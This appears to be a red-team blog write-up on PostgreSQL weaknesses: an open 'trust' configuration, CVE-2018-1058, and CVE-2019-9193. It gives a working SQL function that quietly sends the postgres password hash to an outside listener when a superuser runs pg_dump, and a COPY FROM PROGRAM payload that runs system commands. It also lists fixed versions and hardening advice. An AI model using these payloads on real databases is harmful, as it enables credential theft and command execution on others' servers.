---
title: PostgreSQL: From no authorization to high privilege command execution
description: Cause of PostgreSQL Improper Configuration Vulnerability: As a matter of fact, it is mainly caused by improper administrator configuration.
categories:
 - RedTeam Skill
tags:
 - PostgreSQL
 - Command execution
---


## *No. 1 Introduction to PostgreSQL*

PostgreSQL (also known as postgres) is a free object, it's a relational database server (database management system) distributed under a flexible BSD license. It provides an alternative to other open source database systems, such as MySQL and Firebird, and proprietary systems, such as **Oracle, Sybase, IBM’s DB2**, and **Microsoft SQL Server**.

PostgreSQL is as popular as MySQL, and the database of msf is PostgreSQL. However, if the administrator does not configure PostgreSQL correctly, **it will cause any user to access PostgreSQL database without a password.**

## *No.2 PostgreSQL Unauthorized Vulnerability*

#### Vulnerability Cause

Cause of PostgreSQL Improper Configuration Vulnerability: As a matter of fact, it is mainly caused by improper administrator configuration. PostgreSQL configuration file is `/var/lib/pgsql/9. 2/data/pg_hba. conf`. If the administrator does not properly configure the trusted host (as shown in the following figure), any user can access PostgreSQL database without password.

Here is a brief introduction to the following `pg_hba. conf` configuration file. Excluding the comments, the main effective configuration content is the red circle in the above figure. Explain the meaning of this line:

![image.png]({{site.url}}/upload/2021-02-22-PostgreSQL-From-no-authorization-to-high-privilege-command-execution/ko4Bn25tjQdahWz.png)

```plsql
host    all     all     0.0.0.0/0       trust
```

Host indicates the matching type, the first `all` indicates any database, the second `all` indicates the access of any database user, `0.0. 0.0/0` indicates that any IP address accesses this database service, and the last `trust` indicates password-free login for hosts that meet the conditions.

**The above configuration will result in allowing any source IP host, using any database account, and accessing any database without password, which will directly lead to the disclosure of all data in the database.**

## *No.3 PostgreSQL Authorization Vulnerability*

#### （CVE-2018-1058）

Build a vulnerability platform through VulHub and log in to the data platform to obtain the current session user.

Postgres provides the ability to customize functions! We create the following function:

```plsql
CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$
    select dblink_connect((select 'hostaddr=192.168.8.10 port=7777 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres')));
    SELECT pg_catalog.array_to_string($1,$2);
$$ LANGUAGE SQL VOLATILE;
```

![image.png]({{site.url}}/upload/2021-02-22-PostgreSQL-From-no-authorization-to-high-privilege-command-execution/ph7YvVmWn4AEcsd.png)

Then listen to `1**.***.*.**`port 7777 on , waiting for the superuser to trigger the “backdoor” we left behind.

Execute the `pg_dump` command as root:

```plsql
docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub
```

Export the contents of the VulHub database.

While executing the above command, the “backdoor” has been triggered, and the password encrypted by the administrator MD5 has been received on the `1**.***.*.**` machine:

![image.png]({{site.url}}/upload/2021-02-22-PostgreSQL-From-no-authorization-to-high-privilege-command-execution/7HgsyiMfbtWDwGF.png)

#### Vulnerability fixes

The following version fixes this breakthrough:

```plsql
PostgreSQL PostgreSQL 9.6.8
PostgreSQL PostgreSQL 9.5.12
PostgreSQL PostgreSQL 9.4.17
PostgreSQL PostgreSQL 9.3.22
```

## *No.4 PostgreSQL High Privilege Command Execution Vulnerability*

#### (CVE-2019-9193）

#### Affected Version

PostgreSQL 9.3 to 11.2

In versions 9.3 through 11, there is a “feature” that can be used by administrators or users with “COPY TO/FROM PROGRAM” privileges to execute arbitrary commands.

First connect to postgres and execute POC:

```plsql
DROP TABLE IF EXISTS cmd_exec;

CREATE TABLE cmd_exec(cmd_output text);

COPY cmd_exec FROM PROGRAM 'id';

SELECT * FROM cmd_exec;
```

![image.png]({{site.url}}/upload/2021-02-22-PostgreSQL-From-no-authorization-to-high-privilege-command-execution/GiU5qRpJwtW9ATC.png)

## *No.5 Solution Suggestions*

The roles of `pg_read_server_files, pg_write_server_files, and pg_execute_server_program` involve reading and writing database server files, and have relatively large permissions. Careful consideration should be given when assigning the permissions of this role to database users.

## *No.6 Copyright Notice*

Any direct or indirect consequences and losses caused by the dissemination and utilization of the information provided in this article shall be borne by the user himself, and Bounty Team and the author of this article shall not bear any responsibility for this. Bounty Team has the right to modify and interpret this article. If you want to reprint or disseminate this article, you must ensure the integrity of this article, including all contents such as copyright notice. Without permission from Bounty Team, the content of this article shall not be arbitrarily modified, increased or decreased, and it shall not be used for commercial purposes in any way.

## *No.7 Author*

> york@Bounty Team - DBAPPSecurity
